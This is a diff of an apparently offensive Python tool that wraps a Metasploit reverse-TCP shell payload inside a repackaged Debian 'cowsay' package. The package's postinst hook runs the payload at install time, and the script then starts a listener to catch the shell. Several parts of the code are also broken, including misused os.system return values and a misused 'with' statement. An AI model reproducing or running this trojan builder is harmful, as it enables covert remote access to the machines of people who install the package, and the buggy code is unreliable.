@@ -5,41 +5,42 @@
 ######################################
 
 import sys
-import subprocess
 import signal
 import os
 
 if sys.platform.startswith('linux'):
-    if subprocess.run(['/usr/bin/id', '-u']) != 0:
-        print("[-] You must be root to run this program")
-    else:
+    if os.system("echo $EUID") == 0:
         print("[+] Access granted")
+    else:
+        print("[-] You must be root to run this program")
+        quit()
 else:
     print("[-] Operating system must be Linux to run this")
-
-try:
-    input = input()
-except NameError:
-    pass
+    
 
 def shutdown(signal, frame):
     print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Exiting...\033[0m\n")
     cowsay = os.path.abspath("cowsay") # get absolute path of current working folder
-    subprocess.call(f"rm -rf {cowsay}") # remove the folder
+    os.system(f"rm -rf {cowsay}") # remove the folder
     sys.exit() # exit using system call
 
 def cowsay_installation():
     # Installing cowsay (download only)
-    subprocess.call("apt --download-only install cowsay") 
     print("[+]Installing cowsay")
+    os.system("apt --download-only install cowsay") 
     # Extracting package to a new directory called cowsay
-    subprocess.call("dpkg -x /var/cache/apt/archives/cowsay_3.03+dfsg2-4_all.deb cowsay")
+    os.system("cd ~/home")
+    print("[+] Will install in the home directory of whatever user is currently being used")
+    os.system(f"dpkg -x /var/cache/apt/archives/cowsay_3.03+dfsg2-8_all.deb ~/cowsay")
 
-def build_package(payload_name):
-    subprocess.call("mkdir cowsay/DEBIAN && cd cowsay/DEBIAN")
-    subprocess.call("cat control")
+def build_package(payload_name, default_path):
+    user = os.system("whoami")
+    os.system(f"mkdir {default_path} && touch {payload_name}")
 
-    with open("control", "w") as control:
+    os.system(f"mkdir {default_path}DEBIAN && cd {default_path}/DEBIAN")
+    os.system(f"touch /root/cowsay/DEBIAN/control")
+
+    with open(f"/root/cowsay/DEBIAN/control", "w") as control:
         control.write("Package: cowsay\n")
         control.write("Version: 3.03+dfsg2-4\n")
         control.write("Architecture: all\n")
@@ -50,24 +51,24 @@ def build_package(payload_name):
         control.write("Section: games\n")
         control.write("Priority: optional\n")
         control.write("Homepage: http://www.nog-net/~tony/warez\n")
-        control.write("""Description: configurable talking cow\n
-         Cowsay (or cowthink) will turn text into happy ASCII cows, with\n
-         speech (or thought) balloons. If you don't like cows, ASCII art is\n 
-         available to replace it with some other creatures (Tux, the BSD\n
-         daemon, dragons, and a plethora of animals, from a turkey to\n 
-         an elephant in a snake).""")
+        control.write("""Description: configurable talking cow
+ Cowsay (or cowthink) will turn text into happy ASCII cows, with
+ speech (or thought) balloons. If you don't like cows, ASCII art is 
+ available to replace it with some other creatures (Tux, the BSD
+ daemon, dragons, and a plethora of animals, from a turkey to
+ an elephant in a snake).\n""")
 
-    subprocess.call("cat postinst")
+    os.system(f"touch /root/cowsay/DEBIAN/postinst")
 
-    with open("postinst", "w") as postinst:
-        postinst.write(f"chmod 2755 /usr/games/{payload_name} && usr/games/{payload_name} & /usr/games/cowsay")
+    with open(f"/root/cowsay/DEBIAN/postinst", "w") as postinst:
+        postinst.write(f"chmod 2755 /usr/games/{payload_name} && usr/games/{payload_name} & /usr/games/cowsay\n")
     
 def listener(LHOST):
     print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Listener\033[0m\n")
 
     start_listener = input("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Start Listener?033[0m\n").lower()
     if start_listener in ["y", "yes"]:
-        subprocess.call(f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST {LHOST}; run'")
+        os.system(f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST {LHOST}; run'")
     else:
         sys.exit()
 
@@ -88,38 +89,42 @@ def generate_payload(LHOST, payload_name):
     if start_payload in ["y", "yes"]:
         with os.path.abspath(payload_name) as payload_path:
             print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Starting...\033[0m\n")
-            subprocess.call(f"msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST={LHOST} -b \"\x00\" -f elf -o {payload_path}")
+            os.system(f"msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST={LHOST} -b \"\x00\" -f elf -o {payload_path}")
     else:
         sys.exit()
     
-    subprocess.call("chmod 755 postinst")
-    subprocess.call(f"dpkg-deb --build {os.path.abspath(payload_name)}")
+    os.system("chmod 755 postinst")
+    os.system(f"dpkg-deb --build {os.path.abspath(payload_name)}")
 
 def main():
-    try:
-        if os.path.isfile('/usr/bin/msfconsole'):
-            payload_default = "cowsay_trojan"
-            default_path = '~/cowsay/'
-            payload = input(f"[+] Choose payload name (include full path): (Default) {default_path}")
-            exists = os.path.isfile(payload)
+    print("TEST")
 
-            if payload == "":
-                payload = (default_path)(payload_default)
-            
-            elif not exists:
-                print("[-] Payload does not exist")
+    if os.path.isfile('/usr/bin/msfconsole'):
+        print("TRUE")
+        payload_default = "cowsay_trojan"
+        default_path = "~/cowsay/"
+        payload = input(f"[+] Choose payload name (include full path): (Default) {default_path}")
+        exists = os.path.isfile(payload)
 
-            LHOST = input("Please enter your host address\n\tIf you do not know it then leave blank to automatically work it out for you:")
+        if payload == "":
+            payload = f"{default_path}{payload_default}"
+        
+        elif not exists:
+            print("[-] Payload does not exist")
 
-            if LHOST == "":
-                LHOST = subprocess.call("hostname -I | cut -d' ' -f1")
+        LHOST = input("Please enter your host address\n\tIf you do not know it then leave blank to automatically work it out for you:")
 
-            banner()
-            cowsay_installation()
-            build_package(payload)
-            generate_payload(LHOST, payload)
-            listener(LHOST)
-        else:
-            print("[-] You do not have msfconsole installed, please run the install.sh script first.")
-    except:
-        print("Error")
+        if LHOST == "":
+            LHOST = os.system("hostname -i | awk '{print $2}'")
+        print(LHOST)
+
+        banner()
+        cowsay_installation()
+        build_package(payload, default_path)
+        generate_payload(LHOST, payload)
+        listener(LHOST)
+    else:
+        print("[-] You do not have msfconsole installed, please run the install.sh script first.")
+
+if __name__ == '__main__':
+    main()
